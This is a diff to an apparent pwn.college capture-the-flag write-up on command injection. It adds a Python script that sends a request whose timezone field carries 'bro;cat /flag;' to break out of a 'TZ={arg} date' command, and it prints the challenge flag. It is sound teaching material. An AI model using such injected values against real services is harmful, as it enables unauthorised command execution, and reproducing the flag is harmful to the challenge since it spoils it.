@@ -19,12 +19,27 @@ the command is build in the following way: TZ={arg} date
 -flag popped out
 
 II WAY -> python
-
-
-
+-clicked start
+-opened the terminal
+-ran: 'vim bro'
+-typed: '#!/usr/bin/env python3'
+        'import requests'
+        'from pwn import *'
+        'context.log_level = 'error''
+        'p = process("/challenge/server")'
+        'time.sleep(1)'
+        'url = "http://challenge.localhost/activity"'
+        'params = {'
+                '"timezone-val" : "bro;cat /flag;"'
+                '}'
+        'r = requests.get(url, params)'
+        'print(r.text)'
+-ran: 'chmod a+x bro'
+-ran: './bro'
+-flag popped out
 
 ## 🧑🏾‍🏫 what this challenge teaches u
-
+how to inject command even if the one we craft will be put in the middle of another one
 
 ## 🏁 Flag  
 pwn.college{8UwGQJXpv1SxPzoFhBbVrJL1HXR.QX4gzMzwCO4IDOxEzW}
